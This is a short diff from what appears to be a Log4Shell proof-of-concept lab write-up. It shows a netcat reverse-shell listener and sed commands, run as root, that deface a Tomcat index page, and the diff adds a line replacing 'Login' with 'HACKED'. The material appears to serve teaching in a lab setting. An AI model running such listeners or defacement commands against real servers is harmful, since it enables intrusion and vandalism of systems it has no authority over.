@@ -212,5 +212,7 @@ nc -lvnp 9001
 
 root@kalilab:/usr/local/tomcat# sed -i 's/Hello Again!/<<< LOG4SHELL PoC >>>/g' webapps/ROOT/index.jsp
 
+root@kalilab:/usr/local/tomcat# sed -i 's/Login/HACKED/g' webapps/ROOT/index.jsp
+
 # Refresh browser ;-)
 ```
